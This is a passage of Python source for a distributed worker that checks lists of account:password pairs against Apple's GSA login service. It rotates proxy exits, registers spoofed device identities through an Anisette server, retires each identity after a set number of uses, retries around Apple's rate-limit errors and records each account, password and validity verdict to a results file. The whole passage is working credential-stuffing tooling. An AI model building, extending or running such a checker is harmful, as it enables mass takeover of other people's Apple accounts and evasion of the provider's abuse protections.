    directory = Path(device_root) / 'registrations'
    path = directory / f'{int(slot):03d}.json'
    try:
        directory.mkdir(mode=0o700, parents=True, exist_ok=True)
        value = {'slot': int(slot), 'proxy': str(proxy or ''), 'model': str(model or ''),
                 'at': time.strftime('%Y-%m-%d %H:%M:%S'), 'ts': time.time()}
        atomic_json(path, value)
        return True
    except (OSError, TypeError, ValueError):
        return False


def execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
    """真实认证执行入口：任何异常都落成 done.json，避免节点只看到"进程退出"。"""
    try:
        _execute_auth_unit(directory, descriptor, stop, proxy_pool=proxy_pool)
    except Exception as exc:                                       # noqa: BLE001
        atomic_json(Path(directory) / 'done.json',
                    {'ok': False, 'processed': 0,
                     'error': f'{type(exc).__name__}: {exc}'[:300]})


def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
    from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
    from collections import Counter
    import heapq
    import sys

    directory = Path(directory)
    started = time.time()
    output_path = directory / 'results.jsonl'
    DevicePool, gsa_check, result_bucket = _load_fastcheck()
    proxy = descriptor.get('proxy')
    proxies = []
    if descriptor.get('proxy_api') and proxy_pool is None:
        from fastcheck.proxy_pool import fetch_proxies
        scheme = descriptor.get('proxy_scheme') or 'socks5h'
        # 一次多提几条，包内按账号分摊：一条隧道只承担一个账号，
        # 比整包共用一条出口的失败率低得多。上限 1000 避免把配额一次抽干。
        worker_count = max(1, int(descriptor.get('threads') or 1))
        demand = min(1000, max(int(descriptor.get('rows') or 0), worker_count * 4, 20))
        try:
            proxies = fetch_proxies(descriptor['proxy_api'], demand,
                                    scheme=None if scheme == 'http' else scheme)
        except Exception:                                          # noqa: BLE001
            proxies = []
        proxy = proxies[0] if proxies else None
    elif not proxy:
        proxy = None
    origin = descriptor.get('origin') or 'https://new.ani.sidestore.io'
    device_root = descriptor.get('device_root')
    capacity = int(descriptor.get('device_pool_capacity') or
                   descriptor.get('device_capacity') or 8)
    configured_slots = descriptor.get('device_slots')
    if isinstance(configured_slots, list) and configured_slots:
        slot_ids = [max(1, min(capacity, int(value))) for value in configured_slots]
    else:
        slot_ids = list(range(1, capacity + 1))
    timeout = float(descriptor.get('timeout') or 20)
    retries = max(0, int(descriptor.get('retries') or 0))
    retry_delay = max(0.0, float(descriptor.get('_retry_delay',
                                                PROXY_RETRY_DELAY_SECONDS)))
    configured_workers = max(1, int(descriptor.get('configured_threads') or
                                    descriptor.get('threads') or 1))
    workers = _effective_auth_workers(
        descriptor.get('_active_threads_per_process') or descriptor.get('threads'),
        slot_ids, descriptor.get('process_request_budget'))
    use_limit = max(1, int(descriptor.get('device_use_limit') or DEVICE_USE_LIMIT))
    debug_enabled = _proxy_debug_enabled(descriptor)
    stage_telemetry = StageTelemetry(debug_enabled)
    debug_path = (descriptor.get('_proxy_debug_path') or
                  str(directory / 'proxy-debug.jsonl')) if debug_enabled else None
    exit_ip_debug = _ProxyExitIpDebug(debug_path) if debug_enabled else None
    counters = Counter()
    processed = 0
    last_progress = time.monotonic()

    pool = DevicePool(device_root, origin, max_devices=capacity)
    from fastcheck.workers import device_profile
    _reset_incomplete_device_slots(pool, slot_ids)
    if debug_enabled:
        _write_proxy_debug(debug_path, 'worker_start',
                           rows=int(descriptor.get('rows') or 0),
                           first_row=int(descriptor.get('first_row') or 1),
                           threads=workers, configured_threads=configured_workers,
                           worker_nice=int(descriptor.get('_worker_nice') or 0),
                           retries=retries, timeout=timeout,
                           slots=slot_ids,
                           srp_math_backend=getattr(
                               sys.modules.get('fastcheck.protocols.srp_auth'),
                               'SRP_MATH_BACKEND', 'unknown'),
                           performance_sample_every=PERFORMANCE_TRACE_SAMPLE_EVERY,
                           performance_first_row_sampled=True,
                           credentials_recorded=False)

    # 启动阶段只读取本地设备标识，不向第三方刷新公共头。
    # 公共头由首个取得该设备独占租约的工作线程惰性获取，
    # 然后在该设备的整个生命周期内复用。这样不会在线程池启动前
    # 串行等待 250 个网络请求。
    identities, identity_fetched_at, device_labels = {}, {}, {}
    for index in slot_ids:
        try:
            inspected = pool.inspect(index)
            device_labels[index] = _device_id_label(inspected.get('device_id'))
        except Exception:                                          # noqa: BLE001
            device_labels[index] = 'B64:unknown'

    device_allocator = DeviceLeaseAllocator(
        pool, slot_ids, device_root=device_root, use_limit=use_limit)

    def proxy_for(index):
        token = stage_telemetry.begin('wait_proxy')
        try:
            if proxy_pool is not None:
                # Pool exhaustion is backpressure, not an account result.  A
                # healthy exit may be busy in another worker and become reusable
                # after that request finishes, so keep waiting while the pool has
                # any known (queued or leased) inventory.  Only report an empty
                # pool after both queues and all active leases have remained empty
                # for a full supplier window.
                empty_since = None
                while not stop.is_set():
                    lease = proxy_pool.acquire(wait=PROXY_ACQUIRE_WAIT_SECONDS)
                    if lease is not None:
                        return lease[0], lease
                    state = _proxy_pool_snapshot(proxy_pool)
                    if int(state.get('known') or 0) > 0:
                        empty_since = None
                        continue
                    now = time.monotonic()
                    if empty_since is None:
                        empty_since = now
                    if now - empty_since >= PROXY_EMPTY_GRACE_SECONDS:
                        break
                return None, None
            if not proxies:
                return proxy, None
            return proxies[index % len(proxies)], None
        finally:
            stage_telemetry.end(token)

    def apple_retry_later(result):
        apple_text = ' '.join(str(result.get(key) or '').strip()
                              for key in ('apple_message', 'reason', 'detail')).casefold()
        phrases = (
            'unable to sign you in to your apple account. try again later',
            'this request could not be completed because of a server error',
            'this action cannot be completed',
            'this action could not be completed. try again',
            'the request cannot be processed at this time. please try again later',
            'we cannot process your request, please try again later',
            'your account information was entered incorrectly',
        )
        return any(phrase in apple_text for phrase in phrases)

    def retryable_transport(result):
        try:
            http = int(result.get('http'))
        except (TypeError, ValueError):
            http = None
        try:
            apple_ec = int(result.get('apple_ec'))
        except (TypeError, ValueError):
            apple_ec = None
        # 没拿到 HTTP 响应、服务不可用、Apple 明确要求稍后再试，或
        # Anisette/设备环境失效时重试。重试次数仍严格受用户设置控制。
        return (http in (0, 503)
                or apple_ec in (-22421, -22410, -332000, -33200, -3000303)
                or apple_retry_later(result))

    def auth_result_bucket(result):
        try:
            http = int(result.get('http'))
        except (TypeError, ValueError):
            http = None
        if http in (0, 503):
            return 'timeout'
        bucket = result_bucket(result)
        # 没有命中内置英文原因的结果保留为“其他错误”，
        # 不再因某个 Apple ec 错误码而猜测账号已失效。
        return 'undetermined' if bucket in ('undetermined', 'unknown') else bucket

    identity_default = object()

    def one(row, index, line, start_attempt=0, account_started=None,
            identity_override=identity_default, previous_proxy=None,
            registration_retries=0):
        if stop.is_set():
            return row, line, {'status': 'unknown', 'kind': 'stopped'}
        account, password = _split_account(line)
        account_started = time.time() if account_started is None else account_started
        slot_id, account_prefix = _slot_for_account(account, slot_ids)
        # 空白行仍是输入文件中的一条记录，但不应触发真实认证请求。
        # 作为未判断结果落盘，保证小包按描述的 rows 正常完成。
        if not line.strip():
            return row, line, {'status': 'undetermined', 'kind': 'blank_record',
                               'slot': slot_id, 'device_key': account_prefix, 'elapsed': 0}
        problem = _input_problem(account, password)
        if problem:
            # 输入格式问题不是 Apple 的答复，不能落成 -20970 那种"已失效"。
            return row, line, {'status': 'undetermined', 'kind': 'format_error',
                               'stage': 'input', 'http': None, 'detail': problem,
                               'slot': slot_id, 'device_key': account_prefix, 'elapsed': 0}
        identity = None
        result = None
        previous_proxy = previous_proxy or {'endpoint': '', 'host': '', 'port': None}
        # 用户设置的重试次数仍是唯一上限；节点池只负责每次重试换出口，
        # 不会在“0 次重试”时暗中多发请求。
        attempt_limit = retries + 1
        for attempt in range(start_attempt, attempt_limit):
            # 1000条压测默认只记录首条和每20条中的1条（约5%）。
            # 超过30秒的慢请求即使不在样本中也记录外层耗时；不记录账号、
            # 密码或完整代理地址，避免日志本身改变CPU/吞吐表现。
            trace_sampled = (debug_enabled and (
                row == int(descriptor.get('first_row') or 1)
                or row % PERFORMANCE_TRACE_SAMPLE_EVERY == 0))
            phase_ms = Counter()
            phase_cpu_ms = Counter()
            phase_counts = Counter()

            def collect_phase(event):
                if event.get('event') != 'phase_end':
                    return
                phase = str(event.get('phase') or '')
                if not phase:
                    return
                try:
                    phase_ms[phase] += max(0.0, float(event.get('ms') or 0))
                    phase_cpu_ms[phase] += max(
                        0.0, float(event.get('cpu_ms') or 0))
                    phase_counts[phase] += 1
                    stage_telemetry.observe(
                        'phase_' + phase, event.get('ms') or 0,
                        event.get('cpu_ms') or 0)
                except (TypeError, ValueError):
                    return

            acquire_before = _proxy_pool_snapshot(proxy_pool) if debug_enabled else {}
            acquire_started = time.monotonic() if debug_enabled else None
            account_proxy, lease = proxy_for(index + attempt + registration_retries)
            acquire_ms = (round((time.monotonic() - acquire_started) * 1000, 2)
                          if debug_enabled else None)
            current_proxy = (_proxy_identity(account_proxy) if debug_enabled else
                             {'endpoint': '', 'host': '', 'port': None})
            switch = {
                'previous_endpoint': previous_proxy['endpoint'],
                'host_changed': (previous_proxy['host'] != current_proxy['host']
                                 if previous_proxy['host'] else None),
                'port_changed': (previous_proxy['port'] != current_proxy['port']
                                 if previous_proxy['port'] is not None else None),
                'pair_changed': (previous_proxy['endpoint'] != current_proxy['endpoint']
                                 if previous_proxy['endpoint'] else None),
            }
            if descriptor.get('proxy_api') and not account_proxy:
                result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                          'stage': 'init', 'detail': '代理池暂时无可用出口'}
                if debug_enabled:
                    _write_proxy_debug(
                        debug_path, 'pool_empty', row=row, slot=slot_id,
                        attempt=attempt, attempt_limit=attempt_limit,
                        request_sent=False, acquire_ms=acquire_ms, **switch,
                        pool_before=acquire_before,
                        pool_after=_proxy_pool_snapshot(proxy_pool))
                if attempt + 1 >= attempt_limit:
                    result['_proxy_retries'] = attempt
                    break
                result.update(_retry_at=time.monotonic() + retry_delay,
                              _retry_attempt=attempt + 1,
                              _retry_started=account_started,
                              _retry_identity=None,
                              _retry_previous=current_proxy)
                return row, line, result
            request_started = time.monotonic() if debug_enabled else None
            request_thread_cpu_started = time.thread_time() if debug_enabled else None
            request_process_cpu_started = time.process_time() if debug_enabled else None
            device_lease = None
            device_lease_ms = None
            device_identity_ms = None
            device_was_ready = None
            device_registered = False
            registration_failed = False
            identity_loaded = False
            try:
                device_started = time.monotonic() if debug_enabled else None
                device_wait_token = stage_telemetry.begin('wait_device')
                try:
                    device_lease = device_allocator.acquire(stop)
                finally:
                    stage_telemetry.end(device_wait_token)
                if debug_enabled:
                    device_lease_ms = round(
                        (time.monotonic() - device_started) * 1000, 3)
                slot_id = device_lease.slot
                if device_lease.initial_state == 'ready':
                    identity = _cached_device_identity(
                        identities, identity_fetched_at, slot_id)
                else:
                    # A retired slot has the same number but a new physical
                    # identity.  Never reuse the previous device's 30s cache.
                    identities.pop(slot_id, None)
                    identity_fetched_at.pop(slot_id, None)
                    identity = None
                if identity is None:
                    # device_lease 已经保证同一设备只能被一个线程使用，
                    # 不能再用进程级 Semaphore(1) 把 250 台不同设备的
                    # 公共头获取串行化。
                    with nullcontext():
                        identity_started = time.monotonic() if debug_enabled else None
                        identity = _cached_device_identity(
                            identities, identity_fetched_at, slot_id)
                        if identity is None:
                            ready = pool.inspect(slot_id)['state'] == 'ready'
                            identity_stage = ('identity_fetch' if ready
                                              else 'device_register')
                            identity_token = stage_telemetry.begin(identity_stage)
                            registration_deadline = (
                                time.monotonic() + DEVICE_REGISTRATION_TIMEOUT_SECONDS
                                if not ready else None)
                            try:
                                info_timeout = (max(
                                    0.1, registration_deadline - time.monotonic())
                                    if registration_deadline is not None else timeout)
                                info = pool.info(info_timeout, proxy=account_proxy,
                                                 provider_direct=True)
                                device_was_ready = ready
                                profile = device_profile(pool, slot_id)
                                info = dict(info, client_info=profile['client_info'],
                                            user_agent=profile['user_agent'])
                                identity_timeout = (
                                    max(0.1, registration_deadline - time.monotonic())
                                    if registration_deadline is not None else max(timeout, 40))
                                if (registration_deadline is not None
                                        and identity_timeout <= 0.1):
                                    raise TimeoutError('设备注册超过20秒')
                                identity = pool.fetch_headers(
                                    slot_id, info, identity_timeout, registered=ready,
                                    proxy=account_proxy, provider_direct=True)
                                identity_loaded = True
                                identities[slot_id] = identity
                                identity_fetched_at[slot_id] = time.monotonic()
                                refreshed = pool.inspect(slot_id)
                                device_labels[slot_id] = _device_id_label(
                                    refreshed.get('device_id'))
                                if not ready and refreshed['state'] == 'ready':
                                    device_registered = True
                                    device_allocator.reset_registered(device_lease)
                                    record_device_registration(
                                        device_root, slot_id, account_proxy,
                                        profile.get('model', ''))
                            finally:
                                stage_telemetry.end(identity_token)
                        if debug_enabled:
                            device_identity_ms = round(
                                (time.monotonic() - identity_started) * 1000, 3)
                if (identity_loaded and start_attempt == 0 and attempt == 0
                        and proxy_pool is not None and lease is not None):
                    # 公共头请求与账号认证使用两次独立租约。这不会
                    # 重新请求代理 API，只是将头生成所用出口归还内存池，
                    # 然后为真实认证取一条当前可用出口。
                    proxy_pool.release(lease, healthy=True)
                    lease = None
                    account_proxy, lease = proxy_for(
                        index + attempt + registration_retries)
                    if not account_proxy:
                        raise RuntimeError('公共头已生成，但代理池暂时无认证出口')
                    if debug_enabled:
                        current_proxy = _proxy_identity(account_proxy)
                # Only the actual external request consumes one use.  The
                # twentieth request retires this identity in release().
                device_use = device_allocator.consume(device_lease)
                # 换 IP 重试由节点池处理，协议层每次只使用当前出口一次。
                auth_token = stage_telemetry.begin('auth_request')
                try:
                    result = gsa_check(
                        account, password, account_proxy, timeout=timeout,
                        retries=0 if proxy_pool is not None else retries,
                        cancel=stop.is_set, identity=identity,
                        diagnostics=(collect_phase if debug_enabled else None))
                finally:
                    stage_telemetry.end(auth_token)
                result['_device_use'] = device_use
                if descriptor.get('_web_secondary_auth'):
                    def rotate_web(web_attempt):
                        nonlocal account_proxy, lease, current_proxy
                        if proxy_pool is not None:
                            if lease is not None:
                                proxy_pool.discard(lease)
                                lease = None
                            account_proxy, lease = proxy_for(index + attempt + web_attempt)
                            current_proxy = (_proxy_identity(account_proxy)
                                             if debug_enabled else current_proxy)
                            return account_proxy, account_proxy is not None
                        if len(proxies) > 1:
                            account_proxy = proxies[(index + attempt + web_attempt) % len(proxies)]
                            current_proxy = (_proxy_identity(account_proxy)
                                             if debug_enabled else current_proxy)
                            return account_proxy, True
                        return account_proxy, False

                    if proxy_pool is not None or len(proxies) > 1:
                        result = _refine_repair_auth_with_rotation(
                            result, account, password, account_proxy, timeout,
                            stop.is_set, retries, rotate_web)
                    else:
                        result = _refine_repair_auth(
                            result, account, password, account_proxy, timeout,
                            stop.is_set, retries=retries)
            except Exception as exc:                               # noqa: BLE001
                registration_failed = bool(
                    device_lease is not None
                    and device_lease.initial_state != 'ready'
                    and not device_registered
                    and pool.inspect(device_lease.slot).get('state') != 'ready')
                if (device_lease is not None and
                        device_lease.initial_state != 'ready' and
                        device_lease.clear_incomplete_identity()):
                    identities.pop(device_lease.slot, None)
                    identity_fetched_at.pop(device_lease.slot, None)
                    device_labels[device_lease.slot] = ''
                result = {'status': 'error', 'kind': type(exc).__name__, 'http': 0,
                          'stage': 'init', 'detail': str(exc)[:180]}
            finally:
                if device_lease is not None:
                    device_lease.release()
            request_ms = (round((time.monotonic() - request_started) * 1000, 2)
                          if debug_enabled else None)
            request_thread_cpu_ms = (
                round((time.thread_time() - request_thread_cpu_started) * 1000, 3)
                if debug_enabled else None)
            process_cpu_ms_during_request = (
                round((time.process_time() - request_process_cpu_started) * 1000, 3)
                if debug_enabled else None)
            transport_failed = retryable_transport(result)
            try:
                result_http = int(result.get('http'))
            except (TypeError, ValueError):
                result_http = None
            try:
                apple_ec = int(result.get('apple_ec'))
            except (TypeError, ValueError):
                apple_ec = None
            try:
                web_http = int(result.get('web_http'))
            except (TypeError, ValueError):
                web_http = None
            web_failed = (str(result.get('web_status') or '').casefold() == 'error'
                          and web_http in (0, 500, 502, 503, 504))
            if transport_failed or web_failed:
                error_text = ' '.join(str(result.get(key) or '') for key in
                                      ('kind', 'detail', 'web_kind', 'web_detail')).casefold()
                if result_http == 503 or web_http == 503:
                    error_category = 'http_503'
                elif 'ssl' in error_text or 'certificate' in error_text:
                    error_category = 'tls'
                elif 'socks' in error_text:
                    error_category = 'socks'
                elif 'timeout' in error_text or 'timed out' in error_text:
                    error_category = 'timeout'
                elif 'connect' in error_text:
                    error_category = 'connect'
                elif apple_ec in (-22421, -22410, -332000, -33200, -3000303):
                    error_category = 'apple_transient'
                else:
                    error_category = 'transport_other'
                stage_telemetry.record_error(error_category)
            if debug_enabled and (trace_sampled
                                  or (request_ms or 0) >= PERFORMANCE_TRACE_SLOW_MS):
                _write_proxy_debug(
                    debug_path, 'auth_timing', row=row, slot=slot_id,
                    attempt=attempt, sampled=trace_sampled,
                    proxy_acquire_ms=acquire_ms,
                    device_lease_ms=device_lease_ms,
                    device_identity_ms=device_identity_ms,
                    request_ms=request_ms,
                    request_thread_cpu_ms=request_thread_cpu_ms,
                    request_non_cpu_ms=round(max(
                        0.0, request_ms - request_thread_cpu_ms), 3),
                    process_cpu_ms_during_request=process_cpu_ms_during_request,
                    process_core_equivalents_during_request=(
                        round(process_cpu_ms_during_request / request_ms, 3)
                        if request_ms > 0 else None),
                    trace_sample_every=PERFORMANCE_TRACE_SAMPLE_EVERY,
                    srp=_srp_timing_summary(
                        phase_ms, phase_cpu_ms, phase_counts, trace_sampled),
                    device_was_ready=device_was_ready,
                    device_registered=device_registered,
                    http=result_http, apple_ec=apple_ec,
                    status=str(result.get('status') or ''),
                    stage=str(result.get('stage') or ''))
            # HTTP 0 and transient 5xx are retry outcomes: remove that exact lease now,
            # wait five seconds, then acquire an available (never in-use) exit.
            # Proxy-auth 407 and other transport failures retain the general
            # three-strike policy used outside this retry branch.
            # 明确重试条件都淘汰当前出口，等待 5 秒后从池中获取
            # 另一条 IP；否则刚释放的健康租约可能被同一账号再次拿到。
            immediate_discard = (result_http in (0, 503) or web_failed
                                 or apple_ec in (-22410, -332000, -33200, -3000303)
                                 or apple_retry_later(result))
            healthy_exit = result_http not in (None, 0, 407) and not web_failed
            if proxy_pool is not None and lease is not None:
                if immediate_discard:
                    proxy_pool.discard(lease)
                else:
                    proxy_pool.release(lease, healthy=healthy_exit)
            if registration_failed and not stop.is_set():
                # Registration never sent the account request. Discard this
                # exit and retry the same account/device acquisition with a
                # different IP without consuming the user's auth retry count.
                result.update(_retry_at=time.monotonic() + 0.2,
                              _retry_attempt=attempt,
                              _retry_started=account_started,
                              _retry_identity=None,
                              _retry_previous=current_proxy,
                              _registration_retries=registration_retries + 1)
                return row, line, result
            if debug_enabled and (web_failed or int(result.get('web_attempts') or 0) > 1):
                _write_proxy_debug(
                    debug_path, 'web_retry_result', row=row, slot=slot_id,
                    web_http=web_http,
                    web_status=str(result.get('web_status') or ''),
                    web_attempts=int(result.get('web_attempts') or 0),
                    web_proxy_rotations=int(result.get('web_proxy_rotations') or 0),
                    web_rotation_exhausted=bool(result.get('web_rotation_exhausted')),
                    last_endpoint=current_proxy['endpoint'],
                    release=('discarded' if immediate_discard else 'reusable'),
                    pool=_proxy_pool_snapshot(proxy_pool))
            if debug_enabled and transport_failed:
                debug_event = 'timeout_attempt'
                exit_ip_debug.submit(
                    account_proxy, debug_event, row=row, slot=slot_id,
                    attempt=attempt, attempt_limit=attempt_limit,
                    previous_endpoint=previous_proxy['endpoint'],
                    port_changed=switch['port_changed'],
                    pair_changed=switch['pair_changed'])
                _write_proxy_debug(
                    debug_path, debug_event,
                    row=row, slot=slot_id, attempt=attempt, attempt_limit=attempt_limit,
                    request_sent=True, acquire_ms=acquire_ms, request_ms=request_ms,
                    endpoint=current_proxy['endpoint'], host=current_proxy['host'],
                    port=current_proxy['port'], **switch, http=result_http,
                    status=str(result.get('status') or ''), kind=str(result.get('kind') or ''),
                    stage=str(result.get('stage') or ''),
                    detail=_proxy_debug_detail(result.get('detail')),
                    retryable=transport_failed,
                    lease_reused=bool(lease and int(lease[2]) > 0),
                    release=('discarded' if immediate_discard else
                             ('reusable' if healthy_exit else 'failure_recorded')),
                    pool_before=acquire_before, pool_after=_proxy_pool_snapshot(proxy_pool))
            if apple_ec in (-22421, -22410, -332000, -33200, -3000303):
                # 这不是账号结论；下一次重新获取 Anisette 身份，避免用
                # 同一份无效设备认证数据重复请求。
                identity = None
                identities.pop(slot_id, None)
                identity_fetched_at.pop(slot_id, None)
            previous_proxy = current_proxy
            if not transport_failed or attempt + 1 >= attempt_limit:
                result['_proxy_retries'] = attempt
                break
            # Return this account to the coordinator's delayed retry heap.
            # No worker thread sleeps during the five-second backoff.
            result.update(_retry_at=time.monotonic() + retry_delay,
                          _retry_attempt=attempt + 1,
                          _retry_started=account_started,
                          _retry_identity=None,
                          _retry_previous=current_proxy,
                          _registration_retries=registration_retries)
            return row, line, result
        if result is None:
            result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                      'stage': 'init', 'detail': '代理池未返回结果', '_proxy_retries': 0}
        result['elapsed'] = round(time.time() - account_started, 2)
        result['slot'] = slot_id
        result['device_key'] = account_prefix
        if debug_enabled and (auth_result_bucket(result) == 'timeout'
                              or (str(result.get('web_status') or '').casefold() == 'error'
                                  and result.get('web_http') in (0, 500, 502, 503, 504))):
            _write_proxy_debug(
                debug_path, 'final_timeout', row=row, slot=slot_id,
                recorded_retries=int(result.get('_proxy_retries') or 0),
                configured_retries=retries, http=result.get('http'),
                kind=str(result.get('kind') or ''), stage=str(result.get('stage') or ''),
                detail=_proxy_debug_detail(result.get('detail')),
                last_endpoint=previous_proxy['endpoint'],
                pool=_proxy_pool_snapshot(proxy_pool))
        return row, line, result

    stop_flag = stop
    output_digest = hashlib.sha256()
    with (directory / 'input.part').open('r', encoding='utf-8', errors='replace') as source, output_path.open('wb') as output:
        output_path.chmod(0o600)
        first_row = int(descriptor.get('first_row') or 1)
        with ThreadPoolExecutor(max_workers=workers) as workers_pool:
            # 普通账号持续填充线程；需要重试的账号进入时间堆，延迟到期
            # 后再提交，不占用工作线程，也不会阻塞后面的账号。
            pending = set()
            ready = deque()
            delayed = []
            retry_order = 0
            index = 0
            exhausted = False
            while not exhausted or pending or ready or delayed:
                if stop_flag.is_set():
                    raise InterruptedError('租约失效或节点关闭')
                now = time.monotonic()
                while delayed and delayed[0][0] <= now:
                    _at, _order, work = heapq.heappop(delayed)
                    ready.append(work)
                queued_count = sum(1 for future in pending
                                   if not future.running() and not future.done())
                refill_count = _local_queue_refill_count(
                    workers, len(pending), queued_count)
                while refill_count > 0:
                    if ready:
                        work = ready.popleft()
                    elif not exhausted:
                        line = source.readline()
                        if line == '':
                            exhausted = True
                            continue
                        line = line.rstrip('\r\n')
                        work = (first_row + index, index, line)
                        index += 1
                    else:
                        break
                    pending.add(workers_pool.submit(one, *work))
                    refill_count -= 1
                if not pending:
                    if delayed:
                        stop_flag.wait(min(0.05, max(0.0, delayed[0][0] -
                                                     time.monotonic())))
                    continue
                wait_timeout = 0.25
                if delayed:
                    wait_timeout = min(wait_timeout, max(0.0, delayed[0][0] -
                                                         time.monotonic()))
                finished, _unfinished = wait(pending, timeout=wait_timeout,
                                             return_when=FIRST_COMPLETED)
                if not finished:
                    # Debug mode must expose where live threads are blocked even
                    # before the first account finishes.  Otherwise a 20-second
                    # proxy/device/request stall looks like an empty log.
                    now = time.monotonic()
                    if debug_enabled and now - last_progress >= 0.25:
                        atomic_json(directory / 'progress.json',
                                    {'processed': processed, 'started': started,
                                     'counts': dict(counters),
                                     'queue_low_water': LOCAL_QUEUE_LOW_WATER,
                                     'queue_target': LOCAL_QUEUE_TARGET,
                                     'queued': sum(
                                         1 for future in pending
                                         if not future.running() and not future.done()),
                                     'in_flight': sum(
                                         1 for future in pending if future.running()),
                                     'stage_metrics': stage_telemetry.snapshot(
                                         len(delayed))})
                        last_progress = now
                    continue
                future = finished.pop()
                pending.remove(future)
                row, line, result = future.result()
                retry_at = result.pop('_retry_at', None)
                if retry_at is not None:
                    work = (row, row - first_row, line,
                            int(result.pop('_retry_attempt')),
                            result.pop('_retry_started'),
                            result.pop('_retry_identity'),
                            result.pop('_retry_previous'),
                            int(result.pop('_registration_retries', 0)))
                    retry_order += 1
                    heapq.heappush(delayed, (float(retry_at), retry_order, work))
                    continue
                status = auth_result_bucket(result)
                counters[status] += 1
                processed += 1
                # sha256/bytes 是总控的必需字段（结果完整性校验），认证模式同样补齐
                raw_line = line.encode('utf-8')
                account, password = _split_account(line)
                device = result.get('slot') or slot_ids[(row - first_row) % len(slot_ids)]
                business_code = result.get('apple_ec')
                if business_code is None and result.get('kind') == 'format_error':
                    # 面板"结果码"直接显示 format_error，避免和 Apple 的 -20970 混淆。
                    business_code = 'format_error'
                if business_code is None:
                    business_code = (result.get('detail') or result.get('kind') or '')[:180]
                reason = _apple_reason_for_record(result, status, debug_enabled)
                # Registration/format/proxy failures did not send an account
                # request and must not consume a device use.  A successful
                # request always carries the exact value returned by consume().
                device_usage = (int(result['_device_use'])
                                if result.get('_device_use') is not None else
                                device_allocator.current_usage(device))
                record = {'row': row, 'account': account, 'password': password, 'status': status,
                          'sha256': hashlib.sha256(raw_line).hexdigest(), 'bytes': len(raw_line),
                          'stage': result.get('stage') or '', 'http': result.get('http'),
                          'code': str(business_code)[:180], 'reason': reason,
                          'protocol': 'GSA',
                          'device': device,
                          'device_key': result.get('device_key') or '',
                          'device_label': device_labels.get(device, ''),
                          'device_usage': device_usage,
                          'elapsed': result.get('elapsed'),
                          'attempts': max(
                              int(result.get('_proxy_retries') or 0),
                              max(0, int(result.get('web_attempts') or 0) - 1))}
                for key in ('two_factor_method', 'web_auth_type', 'web_http',
                            'web_status', 'web_stage', 'web_kind', 'web_detail',
                            'web_attempts', 'web_server', 'web_via',
                            'web_retry_after', 'web_content_type',
                            'web_response_bytes', 'web_response_sha256',
                            'web_response_keys', 'web_service_error_codes',
                            'web_has_session_headers', 'web_has_set_cookie',
                            'web_proxy_rotations', 'web_rotation_exhausted'):
                    if result.get(key) not in (None, ''):
                        record[key] = result[key]
                submit_token = stage_telemetry.begin('result_submit')
                try:
                    encoded = (json.dumps(record, separators=(',', ':')) + '\n').encode()
                    output.write(encoded)
                    output_digest.update(encoded)
                finally:
                    stage_telemetry.end(submit_token)
                now = time.monotonic()
                if now - last_progress >= 0.25:
                    # The node agent tails this local file once per second and
                    # sends one bounded batch.  Flush here without any network
                    # work in the worker process.  Persist the disjoint device
                    # counters at the same cadence so the pool page reports
                    # live use instead of showing zero until the whole package
                    # (possibly tens of thousands of rows) finishes.
                    output.flush()
                    device_allocator.flush_usage()
                    atomic_json(directory / 'progress.json',
                                {'processed': processed, 'started': started,
                                 'counts': dict(counters),
                                 'queue_low_water': LOCAL_QUEUE_LOW_WATER,
                                 'queue_target': LOCAL_QUEUE_TARGET,
                                 'queued': sum(1 for future in pending
                                               if not future.running() and not future.done()),
                                 'in_flight': sum(1 for future in pending
                                                  if future.running()),
                                 'stage_metrics': stage_telemetry.snapshot(len(delayed))})
                    last_progress = now

    if processed != int(descriptor.get('rows') or 0):
        raise ValueError('输入条数和工作包描述不一致')
    device_allocator.flush_usage()
    atomic_json(directory / 'progress.json',
                {'processed': processed, 'started': started,
                 'counts': dict(counters),
                 'queue_low_water': LOCAL_QUEUE_LOW_WATER,
                 'queue_target': LOCAL_QUEUE_TARGET,
                 'queued': 0, 'in_flight': 0,
                 'stage_metrics': stage_telemetry.snapshot(0)})
    atomic_json(directory / 'done.json',
                {'ok': True, 'processed': processed, 'counts': dict(counters),
                 'checksum': output_digest.hexdigest(),
                 'elapsed': time.time() - started,
                 'stage_metrics': stage_telemetry.snapshot(0)})
    if debug_enabled:
        exit_ip_debug.close()
        _write_proxy_debug(debug_path, 'worker_stop', ok=True, processed=processed,
                           counts=dict(counters), pool=_proxy_pool_snapshot(proxy_pool),
                           exit_ip_probe=exit_ip_debug.snapshot())
